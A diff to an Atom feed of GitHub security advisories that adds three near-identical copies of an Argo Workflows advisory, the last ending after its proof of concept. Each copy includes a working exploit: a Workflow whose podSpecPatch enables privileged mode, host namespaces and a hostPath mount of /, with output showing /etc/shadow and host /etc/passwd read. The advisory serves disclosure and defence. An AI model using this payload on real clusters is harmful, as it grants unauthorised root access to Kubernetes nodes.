@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-03-11T19:14:59.725Z</updated>
+    <updated>2026-03-11T20:05:40.836Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,699 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/argoproj/argo-workflows] Argo Workflows: WorkflowTemplate Security Bypass via podSpecPatch in Strict/Secure Reference Mode]]></title>
+        <id>https://github.com/advisories/GHSA-3wf5-g532-rcrr</id>
+        <link href="https://github.com/advisories/GHSA-3wf5-g532-rcrr"/>
+        <updated>2026-03-11T19:29:35.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A user who can submit Workflows can completely bypass all security settings defined in a <code>WorkflowTemplate</code> by including a <code>podSpecPatch</code> field in their Workflow submission. This works even when the controller is configured with <code>templateReferencing: Strict</code>, which is specifically documented as a mechanism to restrict users to admin-approved templates. The <code>podSpecPatch</code> field on a submitted Workflow takes precedence over the referenced <code>WorkflowTemplate</code> during spec merging and is applied directly to the pod spec at creation time with no security validation.</p>
+<h2 id="details">Details</h2>
+<p>Three issues combine to create this vulnerability:</p>
+<ol>
+<li><p>Merge priority order:<code>JoinWorkflowSpec</code> merges specs with the priority order Workflow Spec &gt; WorkflowTemplate Spec &gt; WorkflowDefault Spec. Because <code>podSpecPatch</code> is a plain string field, the Workflow's value replaces the WorkflowTemplate's value.</p>
+</li>
+<li><p>No security validation on <code>podSpecPatch</code>: <code>ApplyPodSpecPatch()</code> only validates that the patch is syntactically valid JSON conforming to the Kubernetes <code>PodSpec</code> schema. No checks are performed for dangerous security settings such as <code>privileged: true</code>.</p>
+</li>
+<li><p><code>templateReferencing: Strict</code> does not restrict <code>podSpecPatch</code>: Strict mode only checks whether <code>WorkflowTemplateRef</code> is set. If it is, the Workflow passes validation regardless of what other fields (including <code>podSpecPatch</code>) are present.</p>
+</li>
+</ol>
+<h2 id="poc">PoC</h2>
+<h3 id="prerequisites">Prerequisites</h3>
+<p>A local Kubernetes cluster with Argo Workflows installed. The instructions below use <a href="https://kind.sigs.k8s.io/">kind</a>.</p>
+<h4 id="1-create-a-kind-cluster-and-install-argo-workflows">1. Create a kind cluster and install Argo Workflows</h4>
+<pre><code class="language-bash">kind create cluster --name argo-poc
+
+kubectl create namespace argo
+kubectl apply -n argo --server-side \
+  -f https://github.com/argoproj/argo-workflows/releases/download/v4.0.1/install.yaml
+</code></pre>
+<p>Note: <code>--server-side</code> is required because some CRDs exceed the client-side annotation size limit.</p>
+<p>Wait for the controller to be ready:</p>
+<pre><code class="language-bash">kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
+</code></pre>
+<h4 id="2-enable-templatereferencing-strict">2. Enable <code>templateReferencing: Strict</code></h4>
+<p>Patch the workflow controller configmap to enforce Strict mode:</p>
+<pre><code class="language-bash">kubectl patch configmap workflow-controller-configmap -n argo --type merge \
+  -p '{"data":{"workflowRestrictions":"templateReferencing: Strict\n"}}'
+</code></pre>
+<p>Restart the controller to pick up the new config:</p>
+<pre><code class="language-bash">kubectl rollout restart deployment workflow-controller -n argo
+kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
+</code></pre>
+<h4 id="3-verify-strict-mode-is-active">3. Verify Strict mode is active</h4>
+<p>Attempt to submit a standalone Workflow (no <code>workflowTemplateRef</code>). It should be rejected:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: strict-test-
+spec:
+  entrypoint: test
+  templates:
+  - name: test
+    container:
+      image: alpine
+      command: [echo, "hello"]
+EOF
+</code></pre>
+<p>The Workflow will be accepted by the API server but the controller will reject it. After a few seconds, check its status:</p>
+<pre><code class="language-bash">STRICT_WF=$(kubectl get workflow -n argo -o name | grep strict-test | tail -1)
+kubectl get -n argo "$STRICT_WF" -o jsonpath='{.status.phase} {.status.message}'
+</code></pre>
+<p>Expected output:</p>
+<pre><code>Error workflows must use workflowTemplateRef to be executed when the controller is in reference mode
+</code></pre>
+<h4 id="4-create-a-hardened-workflowtemplate">4: Create a hardened WorkflowTemplate</h4>
+<p>An administrator creates a <code>WorkflowTemplate</code> with restrictive security settings:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl apply -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: secure-template
+  namespace: argo
+  annotations:
+    description: "Admin-approved secure template with hardened security settings"
+spec:
+  entrypoint: secure-task
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 1000
+  templates:
+  - name: secure-task
+    container:
+      image: alpine:latest
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          echo "=== Security Context Check ==="
+          echo "Current UID: $(id -u)"
+          echo "Current GID: $(id -g)"
+          if cat /etc/shadow 2&gt;/dev/null; then
+            echo "EXPLOITED: Can read /etc/shadow!"
+          else
+            echo "SECURE: Cannot read /etc/shadow"
+          fi
+          if ls /host/etc/passwd 2&gt;/dev/null; then
+            echo "EXPLOITED: Host filesystem accessible!"
+            cat /host/etc/passwd | head -5
+          else
+            echo "SECURE: No host filesystem access"
+          fi
+          if [ "$(id -u)" = "0" ]; then
+            echo "EXPLOITED: Running as root!"
+          else
+            echo "SECURE: Running as non-root (UID: $(id -u))"
+          fi
+          echo "=== End Check ==="
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        allowPrivilegeEscalation: false
+        capabilities:
+          drop:
+            - ALL
+EOF
+</code></pre>
+<h4 id="5-submit-a-legitimate-workflow-baseline">5. Submit a legitimate Workflow (baseline)</h4>
+<p>Submit a Workflow that references the secure template without modification:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: legit-use-
+  namespace: argo
+spec:
+  workflowTemplateRef:
+    name: secure-template
+EOF
+</code></pre>
+<p>Wait for completion and check logs:</p>
+<pre><code class="language-bash">LEGIT_WF=$(kubectl get workflow -n argo -o name | grep legit-use | tail -1)
+kubectl wait -n argo --for=condition=Completed "$LEGIT_WF" --timeout=120s
+kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $LEGIT_WF)" -c main
+</code></pre>
+<p>Expected output (confirming the template's security settings are applied):</p>
+<pre><code>=== Security Context Check ===
+Current UID: 1000
+Current GID: 0
+SECURE: Cannot read /etc/shadow
+SECURE: No host filesystem access
+SECURE: Running as non-root (UID: 1000)
+=== End Check ===
+</code></pre>
+<h4 id="6-submit-the-bypass-workflow">6. Submit the bypass Workflow</h4>
+<p>Submit a Workflow that references the same secure template but includes a <code>podSpecPatch</code> that overrides all security settings:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: bypass-security-
+  namespace: argo
+spec:
+  workflowTemplateRef:
+    name: secure-template
+  podSpecPatch: |
+    hostPID: true
+    hostNetwork: true
+    containers:
+    - name: main
+      securityContext:
+        privileged: true
+        runAsUser: 0
+        runAsNonRoot: false
+        allowPrivilegeEscalation: true
+        capabilities:
+          add:
+            - ALL
+          drop: []
+      volumeMounts:
+      - name: host-root
+        mountPath: /host
+    volumes:
+    - name: host-root
+      hostPath:
+        path: /
+        type: Directory
+EOF
+</code></pre>
+<p>Wait for completion and check logs:</p>
+<pre><code class="language-bash">BYPASS_WF=$(kubectl get workflow -n argo -o name | grep bypass-security | tail -1)
+kubectl wait -n argo --for=condition=Completed "$BYPASS_WF" --timeout=120s
+kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $BYPASS_WF)" -c main
+</code></pre>
+<p>Expected output (all security settings bypassed):</p>
+<pre><code>=== Security Context Check ===
+Current UID: 0
+Current GID: 0
+root:*::0:::::
+bin:!::0:::::
+[... /etc/shadow contents dumped ...]
+EXPLOITED: Can read /etc/shadow!
+EXPLOITED: Host filesystem accessible!
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[... host /etc/passwd contents ...]
+EXPLOITED: Running as root!
+=== End Check ===
+</code></pre>
+<p>The file <code>/etc/shadow</code> is readable (root), the host filesystem is mounted and accessible, and the container runs as UID 0.</p>
+<h2 id="impact">Impact</h2>
+<p>The purpose of <code>templateReferencing: Strict</code> is to restrict users to only execute admin-approved <code>WorkflowTemplates</code>. This is explicitly <a href="https://argo-workflows.readthedocs.io/en/latest/security/">documented</a> as a security feature:</p>
+<blockquote>
+<p>You can typically further restrict what a user can do to just being able to submit workflows from templates using the workflow restrictions feature.</p>
+</blockquote>
+<p>A user who can submit Workflows referencing approved templates can use <code>podSpecPatch</code> to:</p>
+<ul>
+<li>Run containers as root (<code>runAsUser: 0</code>)</li>
+<li>Enable privileged mode (<code>privileged: true</code>)</li>
+<li>Mount the host filesystem (<code>hostPath</code> volumes)</li>
+<li>Share host PID/network/IPC namespaces (<code>hostPID</code>, <code>hostNetwork</code>, <code>hostIPC</code>)</li>
+<li>Add all Linux capabilities (<code>capabilities.add: ["ALL"]</code>)</li>
+</ul>
+<p>This effectively grants the user full root access to the underlying Kubernetes node, regardless of what security constraints the admin configured in the <code>WorkflowTemplate</code>.</p>
+<p>The <code>templateReferencing</code> feature was introduced in Argo Workflows v2.9.0 through PR #3149.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>When <code>templateReferencing: Strict</code> or <code>Secure</code> is enabled, the controller should reject Workflows that include a <code>podSpecPatch</code> field when using <code>workflowTemplateRef</code>.</p>
+<p>Without the codefix, deploying an admission controller (OPA/Gatekeeper, Kyverno) with policies that block dangerous pod settings (<code>privileged</code>, <code>hostPID</code>, <code>hostNetwork</code>, <code>hostIPC</code>, <code>hostPath</code>) on pods created by Argo Workflows.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31892">https://nvd.nist.gov/vuln/detail/CVE-2026-31892</a></li>
+<li><a href="https://github.com/advisories/GHSA-3wf5-g532-rcrr">https://github.com/advisories/GHSA-3wf5-g532-rcrr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3wf5-g532-rcrr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-11T19:29:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/argoproj/argo-workflows/v3] Argo Workflows: WorkflowTemplate Security Bypass via podSpecPatch in Strict/Secure Reference Mode]]></title>
+        <id>https://github.com/advisories/GHSA-3wf5-g532-rcrr</id>
+        <link href="https://github.com/advisories/GHSA-3wf5-g532-rcrr"/>
+        <updated>2026-03-11T19:29:35.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A user who can submit Workflows can completely bypass all security settings defined in a <code>WorkflowTemplate</code> by including a <code>podSpecPatch</code> field in their Workflow submission. This works even when the controller is configured with <code>templateReferencing: Strict</code>, which is specifically documented as a mechanism to restrict users to admin-approved templates. The <code>podSpecPatch</code> field on a submitted Workflow takes precedence over the referenced <code>WorkflowTemplate</code> during spec merging and is applied directly to the pod spec at creation time with no security validation.</p>
+<h2 id="details">Details</h2>
+<p>Three issues combine to create this vulnerability:</p>
+<ol>
+<li><p>Merge priority order:<code>JoinWorkflowSpec</code> merges specs with the priority order Workflow Spec &gt; WorkflowTemplate Spec &gt; WorkflowDefault Spec. Because <code>podSpecPatch</code> is a plain string field, the Workflow's value replaces the WorkflowTemplate's value.</p>
+</li>
+<li><p>No security validation on <code>podSpecPatch</code>: <code>ApplyPodSpecPatch()</code> only validates that the patch is syntactically valid JSON conforming to the Kubernetes <code>PodSpec</code> schema. No checks are performed for dangerous security settings such as <code>privileged: true</code>.</p>
+</li>
+<li><p><code>templateReferencing: Strict</code> does not restrict <code>podSpecPatch</code>: Strict mode only checks whether <code>WorkflowTemplateRef</code> is set. If it is, the Workflow passes validation regardless of what other fields (including <code>podSpecPatch</code>) are present.</p>
+</li>
+</ol>
+<h2 id="poc">PoC</h2>
+<h3 id="prerequisites">Prerequisites</h3>
+<p>A local Kubernetes cluster with Argo Workflows installed. The instructions below use <a href="https://kind.sigs.k8s.io/">kind</a>.</p>
+<h4 id="1-create-a-kind-cluster-and-install-argo-workflows">1. Create a kind cluster and install Argo Workflows</h4>
+<pre><code class="language-bash">kind create cluster --name argo-poc
+
+kubectl create namespace argo
+kubectl apply -n argo --server-side \
+  -f https://github.com/argoproj/argo-workflows/releases/download/v4.0.1/install.yaml
+</code></pre>
+<p>Note: <code>--server-side</code> is required because some CRDs exceed the client-side annotation size limit.</p>
+<p>Wait for the controller to be ready:</p>
+<pre><code class="language-bash">kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
+</code></pre>
+<h4 id="2-enable-templatereferencing-strict">2. Enable <code>templateReferencing: Strict</code></h4>
+<p>Patch the workflow controller configmap to enforce Strict mode:</p>
+<pre><code class="language-bash">kubectl patch configmap workflow-controller-configmap -n argo --type merge \
+  -p '{"data":{"workflowRestrictions":"templateReferencing: Strict\n"}}'
+</code></pre>
+<p>Restart the controller to pick up the new config:</p>
+<pre><code class="language-bash">kubectl rollout restart deployment workflow-controller -n argo
+kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
+</code></pre>
+<h4 id="3-verify-strict-mode-is-active">3. Verify Strict mode is active</h4>
+<p>Attempt to submit a standalone Workflow (no <code>workflowTemplateRef</code>). It should be rejected:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: strict-test-
+spec:
+  entrypoint: test
+  templates:
+  - name: test
+    container:
+      image: alpine
+      command: [echo, "hello"]
+EOF
+</code></pre>
+<p>The Workflow will be accepted by the API server but the controller will reject it. After a few seconds, check its status:</p>
+<pre><code class="language-bash">STRICT_WF=$(kubectl get workflow -n argo -o name | grep strict-test | tail -1)
+kubectl get -n argo "$STRICT_WF" -o jsonpath='{.status.phase} {.status.message}'
+</code></pre>
+<p>Expected output:</p>
+<pre><code>Error workflows must use workflowTemplateRef to be executed when the controller is in reference mode
+</code></pre>
+<h4 id="4-create-a-hardened-workflowtemplate">4: Create a hardened WorkflowTemplate</h4>
+<p>An administrator creates a <code>WorkflowTemplate</code> with restrictive security settings:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl apply -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: secure-template
+  namespace: argo
+  annotations:
+    description: "Admin-approved secure template with hardened security settings"
+spec:
+  entrypoint: secure-task
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 1000
+  templates:
+  - name: secure-task
+    container:
+      image: alpine:latest
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          echo "=== Security Context Check ==="
+          echo "Current UID: $(id -u)"
+          echo "Current GID: $(id -g)"
+          if cat /etc/shadow 2&gt;/dev/null; then
+            echo "EXPLOITED: Can read /etc/shadow!"
+          else
+            echo "SECURE: Cannot read /etc/shadow"
+          fi
+          if ls /host/etc/passwd 2&gt;/dev/null; then
+            echo "EXPLOITED: Host filesystem accessible!"
+            cat /host/etc/passwd | head -5
+          else
+            echo "SECURE: No host filesystem access"
+          fi
+          if [ "$(id -u)" = "0" ]; then
+            echo "EXPLOITED: Running as root!"
+          else
+            echo "SECURE: Running as non-root (UID: $(id -u))"
+          fi
+          echo "=== End Check ==="
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        allowPrivilegeEscalation: false
+        capabilities:
+          drop:
+            - ALL
+EOF
+</code></pre>
+<h4 id="5-submit-a-legitimate-workflow-baseline">5. Submit a legitimate Workflow (baseline)</h4>
+<p>Submit a Workflow that references the secure template without modification:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: legit-use-
+  namespace: argo
+spec:
+  workflowTemplateRef:
+    name: secure-template
+EOF
+</code></pre>
+<p>Wait for completion and check logs:</p>
+<pre><code class="language-bash">LEGIT_WF=$(kubectl get workflow -n argo -o name | grep legit-use | tail -1)
+kubectl wait -n argo --for=condition=Completed "$LEGIT_WF" --timeout=120s
+kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $LEGIT_WF)" -c main
+</code></pre>
+<p>Expected output (confirming the template's security settings are applied):</p>
+<pre><code>=== Security Context Check ===
+Current UID: 1000
+Current GID: 0
+SECURE: Cannot read /etc/shadow
+SECURE: No host filesystem access
+SECURE: Running as non-root (UID: 1000)
+=== End Check ===
+</code></pre>
+<h4 id="6-submit-the-bypass-workflow">6. Submit the bypass Workflow</h4>
+<p>Submit a Workflow that references the same secure template but includes a <code>podSpecPatch</code> that overrides all security settings:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: bypass-security-
+  namespace: argo
+spec:
+  workflowTemplateRef:
+    name: secure-template
+  podSpecPatch: |
+    hostPID: true
+    hostNetwork: true
+    containers:
+    - name: main
+      securityContext:
+        privileged: true
+        runAsUser: 0
+        runAsNonRoot: false
+        allowPrivilegeEscalation: true
+        capabilities:
+          add:
+            - ALL
+          drop: []
+      volumeMounts:
+      - name: host-root
+        mountPath: /host
+    volumes:
+    - name: host-root
+      hostPath:
+        path: /
+        type: Directory
+EOF
+</code></pre>
+<p>Wait for completion and check logs:</p>
+<pre><code class="language-bash">BYPASS_WF=$(kubectl get workflow -n argo -o name | grep bypass-security | tail -1)
+kubectl wait -n argo --for=condition=Completed "$BYPASS_WF" --timeout=120s
+kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $BYPASS_WF)" -c main
+</code></pre>
+<p>Expected output (all security settings bypassed):</p>
+<pre><code>=== Security Context Check ===
+Current UID: 0
+Current GID: 0
+root:*::0:::::
+bin:!::0:::::
+[... /etc/shadow contents dumped ...]
+EXPLOITED: Can read /etc/shadow!
+EXPLOITED: Host filesystem accessible!
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[... host /etc/passwd contents ...]
+EXPLOITED: Running as root!
+=== End Check ===
+</code></pre>
+<p>The file <code>/etc/shadow</code> is readable (root), the host filesystem is mounted and accessible, and the container runs as UID 0.</p>
+<h2 id="impact">Impact</h2>
+<p>The purpose of <code>templateReferencing: Strict</code> is to restrict users to only execute admin-approved <code>WorkflowTemplates</code>. This is explicitly <a href="https://argo-workflows.readthedocs.io/en/latest/security/">documented</a> as a security feature:</p>
+<blockquote>
+<p>You can typically further restrict what a user can do to just being able to submit workflows from templates using the workflow restrictions feature.</p>
+</blockquote>
+<p>A user who can submit Workflows referencing approved templates can use <code>podSpecPatch</code> to:</p>
+<ul>
+<li>Run containers as root (<code>runAsUser: 0</code>)</li>
+<li>Enable privileged mode (<code>privileged: true</code>)</li>
+<li>Mount the host filesystem (<code>hostPath</code> volumes)</li>
+<li>Share host PID/network/IPC namespaces (<code>hostPID</code>, <code>hostNetwork</code>, <code>hostIPC</code>)</li>
+<li>Add all Linux capabilities (<code>capabilities.add: ["ALL"]</code>)</li>
+</ul>
+<p>This effectively grants the user full root access to the underlying Kubernetes node, regardless of what security constraints the admin configured in the <code>WorkflowTemplate</code>.</p>
+<p>The <code>templateReferencing</code> feature was introduced in Argo Workflows v2.9.0 through PR #3149.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>When <code>templateReferencing: Strict</code> or <code>Secure</code> is enabled, the controller should reject Workflows that include a <code>podSpecPatch</code> field when using <code>workflowTemplateRef</code>.</p>
+<p>Without the codefix, deploying an admission controller (OPA/Gatekeeper, Kyverno) with policies that block dangerous pod settings (<code>privileged</code>, <code>hostPID</code>, <code>hostNetwork</code>, <code>hostIPC</code>, <code>hostPath</code>) on pods created by Argo Workflows.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-3wf5-g532-rcrr</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31892">https://nvd.nist.gov/vuln/detail/CVE-2026-31892</a></li>
+<li><a href="https://github.com/advisories/GHSA-3wf5-g532-rcrr">https://github.com/advisories/GHSA-3wf5-g532-rcrr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3wf5-g532-rcrr</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-11T19:29:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/argoproj/argo-workflows/v4] Argo Workflows: WorkflowTemplate Security Bypass via podSpecPatch in Strict/Secure Reference Mode]]></title>
+        <id>https://github.com/advisories/GHSA-3wf5-g532-rcrr</id>
+        <link href="https://github.com/advisories/GHSA-3wf5-g532-rcrr"/>
+        <updated>2026-03-11T19:29:35.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A user who can submit Workflows can completely bypass all security settings defined in a <code>WorkflowTemplate</code> by including a <code>podSpecPatch</code> field in their Workflow submission. This works even when the controller is configured with <code>templateReferencing: Strict</code>, which is specifically documented as a mechanism to restrict users to admin-approved templates. The <code>podSpecPatch</code> field on a submitted Workflow takes precedence over the referenced <code>WorkflowTemplate</code> during spec merging and is applied directly to the pod spec at creation time with no security validation.</p>
+<h2 id="details">Details</h2>
+<p>Three issues combine to create this vulnerability:</p>
+<ol>
+<li><p>Merge priority order:<code>JoinWorkflowSpec</code> merges specs with the priority order Workflow Spec &gt; WorkflowTemplate Spec &gt; WorkflowDefault Spec. Because <code>podSpecPatch</code> is a plain string field, the Workflow's value replaces the WorkflowTemplate's value.</p>
+</li>
+<li><p>No security validation on <code>podSpecPatch</code>: <code>ApplyPodSpecPatch()</code> only validates that the patch is syntactically valid JSON conforming to the Kubernetes <code>PodSpec</code> schema. No checks are performed for dangerous security settings such as <code>privileged: true</code>.</p>
+</li>
+<li><p><code>templateReferencing: Strict</code> does not restrict <code>podSpecPatch</code>: Strict mode only checks whether <code>WorkflowTemplateRef</code> is set. If it is, the Workflow passes validation regardless of what other fields (including <code>podSpecPatch</code>) are present.</p>
+</li>
+</ol>
+<h2 id="poc">PoC</h2>
+<h3 id="prerequisites">Prerequisites</h3>
+<p>A local Kubernetes cluster with Argo Workflows installed. The instructions below use <a href="https://kind.sigs.k8s.io/">kind</a>.</p>
+<h4 id="1-create-a-kind-cluster-and-install-argo-workflows">1. Create a kind cluster and install Argo Workflows</h4>
+<pre><code class="language-bash">kind create cluster --name argo-poc
+
+kubectl create namespace argo
+kubectl apply -n argo --server-side \
+  -f https://github.com/argoproj/argo-workflows/releases/download/v4.0.1/install.yaml
+</code></pre>
+<p>Note: <code>--server-side</code> is required because some CRDs exceed the client-side annotation size limit.</p>
+<p>Wait for the controller to be ready:</p>
+<pre><code class="language-bash">kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
+</code></pre>
+<h4 id="2-enable-templatereferencing-strict">2. Enable <code>templateReferencing: Strict</code></h4>
+<p>Patch the workflow controller configmap to enforce Strict mode:</p>
+<pre><code class="language-bash">kubectl patch configmap workflow-controller-configmap -n argo --type merge \
+  -p '{"data":{"workflowRestrictions":"templateReferencing: Strict\n"}}'
+</code></pre>
+<p>Restart the controller to pick up the new config:</p>
+<pre><code class="language-bash">kubectl rollout restart deployment workflow-controller -n argo
+kubectl wait -n argo --for=condition=Ready pod -l app=workflow-controller --timeout=120s
+</code></pre>
+<h4 id="3-verify-strict-mode-is-active">3. Verify Strict mode is active</h4>
+<p>Attempt to submit a standalone Workflow (no <code>workflowTemplateRef</code>). It should be rejected:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: strict-test-
+spec:
+  entrypoint: test
+  templates:
+  - name: test
+    container:
+      image: alpine
+      command: [echo, "hello"]
+EOF
+</code></pre>
+<p>The Workflow will be accepted by the API server but the controller will reject it. After a few seconds, check its status:</p>
+<pre><code class="language-bash">STRICT_WF=$(kubectl get workflow -n argo -o name | grep strict-test | tail -1)
+kubectl get -n argo "$STRICT_WF" -o jsonpath='{.status.phase} {.status.message}'
+</code></pre>
+<p>Expected output:</p>
+<pre><code>Error workflows must use workflowTemplateRef to be executed when the controller is in reference mode
+</code></pre>
+<h4 id="4-create-a-hardened-workflowtemplate">4: Create a hardened WorkflowTemplate</h4>
+<p>An administrator creates a <code>WorkflowTemplate</code> with restrictive security settings:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl apply -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: secure-template
+  namespace: argo
+  annotations:
+    description: "Admin-approved secure template with hardened security settings"
+spec:
+  entrypoint: secure-task
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 1000
+    fsGroup: 1000
+  templates:
+  - name: secure-task
+    container:
+      image: alpine:latest
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          echo "=== Security Context Check ==="
+          echo "Current UID: $(id -u)"
+          echo "Current GID: $(id -g)"
+          if cat /etc/shadow 2&gt;/dev/null; then
+            echo "EXPLOITED: Can read /etc/shadow!"
+          else
+            echo "SECURE: Cannot read /etc/shadow"
+          fi
+          if ls /host/etc/passwd 2&gt;/dev/null; then
+            echo "EXPLOITED: Host filesystem accessible!"
+            cat /host/etc/passwd | head -5
+          else
+            echo "SECURE: No host filesystem access"
+          fi
+          if [ "$(id -u)" = "0" ]; then
+            echo "EXPLOITED: Running as root!"
+          else
+            echo "SECURE: Running as non-root (UID: $(id -u))"
+          fi
+          echo "=== End Check ==="
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        allowPrivilegeEscalation: false
+        capabilities:
+          drop:
+            - ALL
+EOF
+</code></pre>
+<h4 id="5-submit-a-legitimate-workflow-baseline">5. Submit a legitimate Workflow (baseline)</h4>
+<p>Submit a Workflow that references the secure template without modification:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: legit-use-
+  namespace: argo
+spec:
+  workflowTemplateRef:
+    name: secure-template
+EOF
+</code></pre>
+<p>Wait for completion and check logs:</p>
+<pre><code class="language-bash">LEGIT_WF=$(kubectl get workflow -n argo -o name | grep legit-use | tail -1)
+kubectl wait -n argo --for=condition=Completed "$LEGIT_WF" --timeout=120s
+kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $LEGIT_WF)" -c main
+</code></pre>
+<p>Expected output (confirming the template's security settings are applied):</p>
+<pre><code>=== Security Context Check ===
+Current UID: 1000
+Current GID: 0
+SECURE: Cannot read /etc/shadow
+SECURE: No host filesystem access
+SECURE: Running as non-root (UID: 1000)
+=== End Check ===
+</code></pre>
+<h4 id="6-submit-the-bypass-workflow">6. Submit the bypass Workflow</h4>
+<p>Submit a Workflow that references the same secure template but includes a <code>podSpecPatch</code> that overrides all security settings:</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' | kubectl create -n argo -f -
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata:
+  generateName: bypass-security-
+  namespace: argo
+spec:
+  workflowTemplateRef:
+    name: secure-template
+  podSpecPatch: |
+    hostPID: true
+    hostNetwork: true
+    containers:
+    - name: main
+      securityContext:
+        privileged: true
+        runAsUser: 0
+        runAsNonRoot: false
+        allowPrivilegeEscalation: true
+        capabilities:
+          add:
+            - ALL
+          drop: []
+      volumeMounts:
+      - name: host-root
+        mountPath: /host
+    volumes:
+    - name: host-root
+      hostPath:
+        path: /
+        type: Directory
+EOF
+</code></pre>
+<p>Wait for completion and check logs:</p>
+<pre><code class="language-bash">BYPASS_WF=$(kubectl get workflow -n argo -o name | grep bypass-security | tail -1)
+kubectl wait -n argo --for=condition=Completed "$BYPASS_WF" --timeout=120s
+kubectl logs -n argo -l "workflows.argoproj.io/workflow=$(basename $BYPASS_WF)" -c main
+</code></pre>
+<p>Expected output (all security settings bypassed):</p>
+<pre><code>=== Security Context Check ===
+Current UID: 0
+Current GID: 0
+root:*::0:::::
+bin:!::0:::::
+[... /etc/shadow contents dumped ...]
+EXPLOITED: Can read /etc/shadow!
+EXPLOITED: Host filesystem accessible!
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[... host /etc/passwd contents ...]
+EXPLOITED: Running as root!
+=== End Check ===
+</code></pre>
